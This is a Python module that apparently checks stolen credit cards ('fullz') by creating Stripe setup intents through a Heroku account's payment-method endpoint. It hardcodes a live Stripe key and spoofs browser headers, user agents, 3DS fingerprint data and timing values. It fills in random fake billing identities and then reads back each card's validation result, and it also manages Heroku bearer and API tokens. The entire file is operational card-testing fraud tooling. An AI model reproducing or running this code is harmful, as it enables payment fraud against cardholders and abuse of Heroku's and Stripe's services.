import asyncio
import random
import uuid
from FUNC.usersdb_func import *
from FUNC.defs import *

async def get_bearer_token(TOKEN_NAME):
    FIND_TOKEN = TOKEN_DB.find_one({"id": TOKEN_NAME}, {"_id": 0})

    if str(FIND_TOKEN) == "None":
        INFO = {
            "id": TOKEN_NAME,
            "token": "N/A",
            "status": "N/A",
        }
        TOKEN_DB.insert_one(INFO)
        return "N/A"

    else:
        return FIND_TOKEN["token"]


async def update_bearer_token(TOKEN_NAME , TOKEN):
    TOKEN_DB.update_one({"id": TOKEN_NAME} , {"$set": {"token": TOKEN, "status": "UPDATED"}})


async def get_api_key():
    FIND_TOKEN = TOKEN_DB.find_one({"id": "AUTH_TOKEN"}, {"_id": 0})

    if str(FIND_TOKEN) == "None":
        INFO = {
            "id": "AUTH_TOKEN",
            "token": "N/A",
            "status": "N/A",
            "api_key": "N/A",
        }
        TOKEN_DB.insert_one(INFO)
        return "N/A"

    else:
        return FIND_TOKEN["api_key"]

    
async def update_api_token(TOKEN_NAME , TOKEN):
    TOKEN_DB.update_one({"id": TOKEN_NAME} , {"$set": {"api_key": TOKEN}})


async def create_bearer_token(session):
    try:
        heroku_api_key = await get_api_key()
        heroku_auth_url = 'https://api.heroku.com/oauth/authorizations'
        headers = {
            'Authorization': f'Bearer {heroku_api_key}',
            'Accept': 'application/vnd.heroku+json; version=3'
        }

        response = await session.post(heroku_auth_url, headers=headers)

        if response.status_code == 201:
            auth_data = response.json()
            bearer_token = auth_data['access_token']['token']
            await update_bearer_token("AUTH_TOKEN", bearer_token)
            return bearer_token
        else:
            await send_alert_to_admin("AUTH_TOKEN")
            return False
    except:
        return False


async def authenticate(json, pk, session):
    try:
        three_d_secure_2_source = json["next_action"]["use_stripe_sdk"]["three_d_secure_2_source"]
        url                     = "https://api.stripe.com/v1/3ds2/authenticate"
        data                    = {
            "source": three_d_secure_2_source,
            "browser": '{"fingerprintAttempted":false,"fingerprintData":null,"challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-US","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-360","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            + str(random.randint(115, 116))
            + '.0.0.0 Safari/537.36"}',
            "one_click_authn_device_support[hosted]": "false",
            "one_click_authn_device_support[same_origin_frame]": "false",
            "one_click_authn_device_support[spc_eligible]": "true",
            "one_click_authn_device_support[webauthn_eligible]": "true",
            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
            "key": pk,
        }
        await session.post(url, data=data)
    except Exception as e:
        pass


async def one_click_3d_check(json, session):
    try:
        three_ds_method_url = json["next_action"]["use_stripe_sdk"]["three_ds_method_url"]
        await session.get(three_ds_method_url)
    except:
        pass


async def create_seti_intent(session, bearer_token):
    try:
        from fake_useragent import UserAgent
        url     = "https://api.heroku.com/account/payment-method/client-token"
        headers = {
            "authority": "api.heroku.com",
            "accept": "application/vnd.heroku+json; version=3",
            "accept-language": "en-US,en;q=0.9",
            "authorization": f"Bearer {bearer_token}",
            "origin": "https://dashboard.heroku.com",
            "referer": "https://dashboard.heroku.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": UserAgent().random,
            "x-heroku-requester": "dashboard",
            "x-origin": "https://dashboard.heroku.com",
        }
        response = await session.post(url = url , headers = headers)
        return response.json()["token"]

    except Exception:
        await create_bearer_token(session)
        return False


async def create_uhq_auth(fullz , session , bearer_token):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        seti_intent       = await create_seti_intent(session, bearer_token)
        if seti_intent == False:
            return "Please Update Bearer Token"

        payment_intent = seti_intent.split("_secret_")[0]
        pk             = "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn"
        guid           = str(uuid.uuid4())
        muid           = str(uuid.uuid4())
        sid            = str(uuid.uuid4())
        data           = await get_random_info(session)
        fname          = data["fname"]
        lname          = data["lname"]
        email          = data["email"]
        phone          = data["phone"]
        add1           = data["add1"]
        city           = data["city"]
        state_short    = data["state_short"]
        zip            = data["zip"]


        url  = "https://api.stripe.com/v1/payment_methods"
        data = {
            "type": "card",
            "billing_details[name]": f"{fname} {lname}",
            "billing_details[email]": email,
            "billing_details[phone]": phone,
            "billing_details[address][city]": city,
            "billing_details[address][country]": "US",
            "billing_details[address][line1]": add1,
            "billing_details[address][line2]": "",
            "billing_details[address][postal_code]": zip,
            "billing_details[address][state]": state_short,
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "payment_user_agent": "stripe.js/fb7ba4c633; stripe-js-v3/fb7ba4c633; split-card-element",
            "time_on_page": random.randint(10021, 10090),
            "key": pk,
        }
        response = await session.post(url, data = data)
        try:
            id = response.json()["id"]
        except:
            return response

        url  = f"https://api.stripe.com/v1/setup_intents/{payment_intent}/confirm"
        data = {
            "payment_method": id,
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": pk,
            "client_secret": seti_intent,
        }
        result = await session.post(url, data = data)

        if "three_d_secure_2_source" in result.text:
            await authenticate(result.json(), pk, session)

        if "three_ds_method_url" in result.text:
            await one_click_3d_check(result.json(), session)

        await asyncio.sleep(0.5)
        result = await session.get(f"https://api.stripe.com/v1/setup_intents/{payment_intent}?key={pk}&is_stripe_sdk=false&client_secret={seti_intent}"
        )

        return result

    except:
        return "N/A"
